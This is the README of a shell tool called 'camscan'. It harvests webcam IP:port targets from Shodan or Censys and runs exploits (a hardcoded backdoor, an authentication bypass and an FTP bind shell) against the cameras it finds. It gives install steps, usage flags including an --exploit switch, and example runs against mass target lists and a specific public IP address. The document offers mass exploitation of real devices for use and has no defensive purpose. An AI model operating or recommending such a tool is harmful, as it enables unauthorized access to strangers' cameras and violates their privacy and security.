Camscan scripts using shodan and censys to get target ip:port
The exploit is for over 20 brnds of webcams that all have 
the hardcoded backdoor, 
authenticatiob bypass, 
the ftp bind shell,

###################################################
# install the following stuff
# censys_io.py (cp censys_io.py /usr/bin/censys_io.py) 
# GeoLiteCity.dat (
# wget http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
# gunzip GeoLiteCity.dat.gz
# cp GeoLiteCity.dat /usr/bin/GeoLiteCity.dat
###################################################
Usage :
 -c/--count <number> 	# how many targets should be pulled from api 
  -e/--exploit		# run exploit on found targets
  -a/--api <number>        # Choose api (0)censys.io (1)shodan.io
  -h/--help			# show this help
Example :
./cam_scan.sh --api 0 --count 100 --exploit
./camscan.sh -a censys -e -c 500 -d
./camscan.sh -a shodan -e -c 500 -d
./camscan.sh -a single -e -i 193.250.224.180:80
./camscan.sh -e -f <IP:PORT list>

Files can be found in /root/.Cam_Scan/output/

support 
K00B404@gmail.com

